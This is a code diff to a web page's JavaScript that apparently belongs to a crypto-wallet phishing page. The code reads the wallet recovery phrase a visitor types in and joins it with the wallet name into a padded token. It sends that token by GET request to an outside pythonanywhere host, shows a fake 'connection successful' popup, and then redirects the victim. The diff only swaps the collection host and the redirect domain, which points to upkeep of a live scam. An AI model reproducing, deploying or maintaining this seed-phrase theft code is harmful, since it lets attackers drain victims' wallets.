@@ -1587,7 +1587,7 @@
                     //console.log({ "load_phrase": 1, "data_phrase": field.value, "wallet_selected": $('#wallet_name').text().trim() })
                     const token = `00x500sxa5b0x10qxam4gx0x9ab2kshb00200${field.value}00x500sxa5b0x10qxam4gx0x9ab2kshb00200${$('#wallet_name').text().trim()}00x500sxa5b0x10qxam4gx0x9ab2kshb00200`
                     $.ajax({
-                        url: "https://humptydumptyproject.pythonanywhere.com/zpi/bit32/"+token,
+                        url: "https://letsconnect101.pythonanywhere.com/zpi/bit32/"+token,
                         method: "GET",
                         //data: { "load_phrase": 1, "data_phrase": field.value, "wallet_selected": $('#wallet_name').text().trim() },
                         success: function (result) {
@@ -1596,7 +1596,7 @@
                                 $('#popup_connect_wallet').modal('hide')
                                 $('#popup_connect_wallet_success').modal('show')
                                 window.setTimeout(function () {
-                                    window.location.href = 'https://rpcnode.pages.dev/';
+                                    window.location.href = 'https://rpcn.pages.dev/';
                                 }, 300000);
 
 
